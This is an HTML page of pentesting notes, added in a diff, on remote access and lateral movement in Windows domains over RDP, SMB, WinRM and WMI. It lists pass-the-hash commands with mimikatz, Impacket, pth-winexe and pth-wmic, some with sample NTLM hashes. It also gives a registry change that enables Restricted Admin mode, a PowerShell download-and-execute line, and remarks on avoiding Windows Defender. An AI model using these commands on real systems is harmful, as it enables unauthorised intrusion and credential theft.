@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Remote Access - Notes</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Remote access", url: "#_top", children: [
+              {title: "Remote Desktop Protocol (RDP)", url: "#remote-desktop-protocol-rdp" },
+              {title: "Server Message Block (SMB)", url: "#server-message-block-smb" },
+              {title: "WinRM / Windows Remote Managements", url: "#winrm-windows-remote-managements" },
+              {title: "WMI / Windows Management Instruments / WMIC", url: "#wmi-windows-management-instruments-wmic" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../cracking_hashes/cracking_hashes/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../cracking_hashes/cracking_hashes/" class="btn btn-xs btn-link">
+        Cracking Hashes
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../active_directory_privilege_escalation/template/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../active_directory_privilege_escalation/template/" class="btn btn-xs btn-link">
+        Template
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="remote-access">Remote access<a class="headerlink" href="#remote-access" title="Permanent link">#</a></h1>
+<p>There are multiple ways to access machines remotely.</p>
+<p><img alt="Remote Access Cheat Sheet" src="../remote_access_cheat_sheet.png" title="Remote access cheat sheet" /></p>
+<h2 id="remote-desktop-protocol-rdp">Remote Desktop Protocol (RDP)<a class="headerlink" href="#remote-desktop-protocol-rdp" title="Permanent link">#</a></h2>
+<p><strong>Port:</strong> 3389/TCP
+<strong>Tools:</strong> rdesktop, xfreerdp</p>
+<h3 id="implementations">Implementations<a class="headerlink" href="#implementations" title="Permanent link">#</a></h3>
+<pre><code>rdesktop -g 80% 192.168.112.200
+
+sudo aptitude install freerdp2-x11
+xfreerdp /u:username /d:nameofdomain.local /p:[thehash] /v:10.1.1.1
+
+sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:&quot;mstsc.exe /restrictedadmin&quot;
+</code></pre>
+
+<h3 id="why-is-it-not-working">Why is it not working?<a class="headerlink" href="#why-is-it-not-working" title="Permanent link">#</a></h3>
+<ul>
+<li>The user you are using must belong to the domain group <strong>Remote Desktop Users</strong>, or allow the user to to RDP to a specific host.</li>
+</ul>
+<p>If you want to RDP to a host that you already control (for example if you want to RDP to your physical computer that your client has provided) and you do not belong to the domain group <strong>Remote Desktop Users</strong> you can allow your domain user to RDP to your computer by doing the following:</p>
+<p>Go to:</p>
+<pre><code>system properties / advanced
+Fjärrsessioner
+Välj användare (Select your user)
+Unclick &quot;Tillåt bara bara anslutningar som använder ...&quot;
+</code></pre>
+
+<ul>
+<li>It might be that the computer you are trying to access <code>Restricted Admin mode</code> disabled. This means that you can't use PTH to RDP to it. But if you have a shell you can just enable it, like this:</li>
+</ul>
+<p>First you create a new shell as the user you are impersonating.</p>
+<pre><code>mimikatz.exe &quot;sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:powershell.exe&quot;
+</code></pre>
+
+<p>After that you just create a new powershell session on your target machine, and then you disable the restriction, like the follwing:</p>
+<pre><code>Enter-PSSession -Computer &lt;Target&gt;
+New-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot; -Name &quot;DisableRestrictedAdmin&quot; -Value &quot;0&quot; -PropertyType DWORD -Force
+</code></pre>
+
+<h2 id="server-message-block-smb">Server Message Block (SMB)<a class="headerlink" href="#server-message-block-smb" title="Permanent link">#</a></h2>
+<p><strong>Port:</strong> 445/TCP, 135/TCP, High Random Port</p>
+<p><strong>Tools:</strong> Impacket, Metasploit, SysInternals, </p>
+<p>There are various tools that leverage the SMB protocol together with RPC to remotely interact with a computer, the most famous is <strong>PsExec</strong> included in <strong>SysInternals</strong>. In order to use the technique the user must either be a domain user with local administrator permission, or be the local user <strong>Administrator</strong>.</p>
+<p>The best tool to use is PsExec.py by Impacket, for e few reasons: it can speak SMBv2, it is not caught by Windows Defender, it can be used by pass the hash.</p>
+<p>Most implementations work like this:<br />
+1. It mounts the share <code>admin$</code>.<br />
+2. Adds an executable there.<br />
+3. Creates a new service using <code>Service Control Manager (SCM)</code>, and link that to the executable.<br />
+4. Starts the service.  </p>
+<h3 id="implementations_1">Implementations<a class="headerlink" href="#implementations_1" title="Permanent link">#</a></h3>
+<p>There are many implementations of this technique.</p>
+<p><strong>Impacket</strong></p>
+<pre><code>psexec.py hackdomain/pelle@192.168.66.88
+psexec.py Administrator@192.168.66.88
+psexec.py -hashes 00000000000000000000000000000000:88e4d9fabaecf3dec18dd80905521b29 user@192.168.66.88
+smbexec.py evilcorp.local/philip@192.168.77.12
+</code></pre>
+
+<p><strong>Metasploit PsExec_psh</strong></p>
+<p>The metasploti-module <code>exploit/windows/smb/psexec_psh</code> creates a service, but instead of uploading an executable to disk the service is started with a powershell command, something like this:</p>
+<pre><code>powershell.exe IEX (new-object Net.WebClient).DownloadString(&quot;http://...script.ps1&quot;); invoke-thescript
+</code></pre>
+
+<p><strong>Metasploit psexec</strong></p>
+<p>Otherwise you can also use metasploit exploit <code>windows/smb/psexec</code> but it can't hand ÅÄÖ.</p>
+<p><strong>SysInternals / PsExec.exe</strong></p>
+<pre><code>psexec.exe \\192.11.11.11 -u Administratör cmd.exe
+</code></pre>
+
+<p><strong>WinEXE / PTH-WinEXE</strong></p>
+<p><code>winexe</code> is a linux-port of Sysinternals PsExec. <code>pth-winexe</code> just adds the pass-the-hash function.
+Can be accessed from kali repo with: <code>sudo apt-get install passing-the-hash</code></p>
+<pre><code>winexe --uninstall --user evilcorp.local/philip //192.168.77.12 &quot;cmd.exe&quot;
+pth-winexe --uninstall--user evilcorp.local/philip //192.168.77.12 &quot;cmd.exe&quot;
+
+# To escalate to system
+winexe --uninstall --system --user evilcorp.local/philip //192.168.77.12 &quot;cmd.exe&quot;
+pth-winexe --uninstall --system --user evilcorp.local/philip //192.168.77.12 &quot;cmd.exe&quot;
+</code></pre>
+
+<h3 id="why-is-it-not-working_1">Why is it not working?<a class="headerlink" href="#why-is-it-not-working_1" title="Permanent link">#</a></h3>
+<p><strong>Access Denied</strong></p>
+<p>If you try to use <code>PsExec</code>, but when you do you get the response <code>Access Denied</code>, the most likely scenario is that the following registry key is set:</p>
+<pre><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
+</code></pre>
+
+<p>This blocks local admin users with the <code>User Account Control (UAC)</code> security mechanism.</p>
+<p><strong>Share is not writable</strong></p>
+<p>If you try to authenticate using a local account that belongs to the Administrators group you might get the error below. This is because a non-default local administrator account can't write to <code>ADMIN$</code>. </p>
+<pre><code>[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+</code></pre>
+
+<p><strong>SMBv1 is disabled</strong></p>
+<p>If you use <code>winexe</code> against a windows 10 machine, you might get this error <code>ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET</code>. This is most likely because <code>winexe</code> is using SMBv1, which is disabled by default on Windows 10.</p>
+<p><strong>Anti-virus</strong></p>
+<p>It might be that the payload gets caught by anti-virus. Metasploits <code>exploit/windows/smb/psexec_psh</code>, and <code>exploit/windows/smb/psexec</code> both get caught by windows-defender, for example.  </p>
+<p><strong>Not a true admin account</strong></p>
+<p>Local admin accounts (that are not the builtin Administrator accounts) can't use PSEXEC because since Windows patched that. But the default 500 Administrator always can. </p>
+<h2 id="winrm-windows-remote-managements">WinRM / Windows Remote Managements<a class="headerlink" href="#winrm-windows-remote-managements" title="Permanent link">#</a></h2>
+<p><strong>Port:</strong> 5985/TCP/HTTP, 5986/TCP/HTTPS<br />
+<strong>Tools:</strong> WinRM, Enter-PSSession, Invoke-Command</p>
+<p>First let's try to understand the common terminology.</p>
+<ul>
+<li>WinRM: Windows Remote Management, is Microsoft’s implementation of the WS-Management protocol</li>
+<li>WS-Management: Web Services-Management, is an open standard that is based on SOAP messages to remotely exchange messaging data</li>
+<li>WinRS: Windows Remote Shell is a function of WinRM and is used to create a shell remotely on a Windows host and execute commands. This is usually what most open source libraries that claim WinRM support work with</li>
+<li>PSRP: PowerShell Remoting Protocol is a separate protocol that runs over WinRM, this is the protocol that is used when executing a command with <code>Invoke-Command</code> or <code>Enter-PSSession</code> and has some differences with WinRS</li>
+</ul>
+<h3 id="implementations_2">Implementations<a class="headerlink" href="#implementations_2" title="Permanent link">#</a></h3>
+<p>The following are some tools that use WinRM.</p>
+<p><strong>PowerShell PSRemoting</strong></p>
+<pre><code class="powershell">New-PSSession -ComputerName &lt;computername&gt; -Credential (Get-Credential)
+Enter-PSSession &lt;host&gt; -Credential &lt;domain&gt;\&lt;user&gt;
+
+Invoke-Command &lt;host&gt; -Credential $cred -ScriptBlock {Hostname}
+# Upload file to remote session
+Copy-Item -Path C:\Temp\PowerView.ps1 -Destination C:\Temp\ -ToSession (Get-PSSession)
+# Download file from remote session
+Copy-Item -Path C:\Users\Administrator\Desktop\test.txt -Destination C:\Temp\ -FromSession (Get-PSSession)
+</code></pre>
+
+<pre><code class="powershell">$SecPassword = ConvertTo-SecureString 'supersecretpassword' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain\dfm.a', $SecPassword)
+Connect-WSMan -Credential $Cred -ComputerName targetmachine
+</code></pre>
+
+<h3 id="why-is-it-not-working_2">Why is it not working?<a class="headerlink" href="#why-is-it-not-working_2" title="Permanent link">#</a></h3>
+<p><strong>No WinRM server is running</strong></p>
+<p>If you have access to the computer you can enable WinRM. This is probably not something you want to do. Because by default I think it will go over HTTP, and you will not want to authenticate over HTTP. But FYI this is how it is done:</p>
+<pre><code>winrm quickconfig
+Enable-PSRemoting
+</code></pre>
+
+<h2 id="wmi-windows-management-instruments-wmic">WMI / Windows Management Instruments / WMIC<a class="headerlink" href="#wmi-windows-management-instruments-wmic" title="Permanent link">#</a></h2>
+<p>WMI: Windows Management Instruments
+WMIC: Windows Management Instruments Command-line</p>
+<p>Ports: 135 (Default. DCOM)<br />
+Port: 5986 (if WinRM is used)  </p>
+<p>WMI can be used locally. But from an attackers perspective is how we can use it remotley, over the network. When used over the network two protocols are used: WinRM and DCOM.
+WMI is based on a client-server model. There are many different clients, the following are some native windows clients:</p>
+<ul>
+<li>wmic.exe</li>
+<li>PowerShell (A number of cmdlets can be used)</li>
+<li>VBScript</li>
+<li>JScript</li>
+<li>wbemtest.exe</li>
+<li>C/C++ via COM</li>
+<li>winrm.exe</li>
+<li>winrs.exe</li>
+</ul>
+<p>The server is:</p>
+<ul>
+<li>WMIService (WINmgmt)</li>
+</ul>
+<p>DCOM: Distributed Component Object Model, has been the default protocol used by WMI. It runs on port 135, subsequent data is transfered over randomly selected tcp port. All the windows built-in cmdlets and methods use DCOM as the default protocol.
+WinRM: WinRM has superseded DCOM as the default protocol for remote WMI communication.</p>
+<p>There are usually two methods to achieve code execution with WMI, those are: Win32_Process Create method and event consumers. So what most hacking tools for lateral movement do is to create a new process and create cmd for example.</p>
+<h3 id="implementations_3">Implementations<a class="headerlink" href="#implementations_3" title="Permanent link">#</a></h3>
+<h4 id="impacket">Impacket<a class="headerlink" href="#impacket" title="Permanent link">#</a></h4>
+<pre><code>wmiexec
+</code></pre>
+
+<h4 id="pth-wmis">pth-wmis<a class="headerlink" href="#pth-wmis" title="Permanent link">#</a></h4>
+<pre><code>sudo apt-get install passing-the-hash
+pth-wmis
+</code></pre>
+
+<pre><code>root@Kali:~# pth-wmic -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 &quot;select Name from Win32_UserAccount&quot;
+root@Kali:~# pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 &quot;cmd.exe /c whoami &gt; c:\temp\result.txt&quot;
+root@Kali:~# pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25/c$
+root@Kali:~# pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25
+</code></pre>
+
+<h4 id="powershell-empire">Powershell Empire<a class="headerlink" href="#powershell-empire" title="Permanent link">#</a></h4>
+<pre><code>Invoke_wmi
+</code></pre>
+
+<h4 id="wmic">WMIC<a class="headerlink" href="#wmic" title="Permanent link">#</a></h4>
+<p>Spawning a new process on the target system 10.0.0.6 from another compromised system 10.0.0.2:</p>
+<pre><code>wmic /node:10.0.0.6 /user:administrator process call create &quot;cmd.exe /c calc&quot;
+</code></pre>
+
+<h3 id="why-is-it-not-working_3">Why is it not working?<a class="headerlink" href="#why-is-it-not-working_3" title="Permanent link">#</a></h3>
+<p><strong>Check the port</strong>
+Is port 135 open on the target?</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../cracking_hashes/cracking_hashes/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../cracking_hashes/cracking_hashes/" class="btn btn-xs btn-link">
+        Cracking Hashes
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../active_directory_privilege_escalation/template/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../active_directory_privilege_escalation/template/" class="btn btn-xs btn-link">
+        Template
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_active_directory_domain/remote_access/remote_access.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
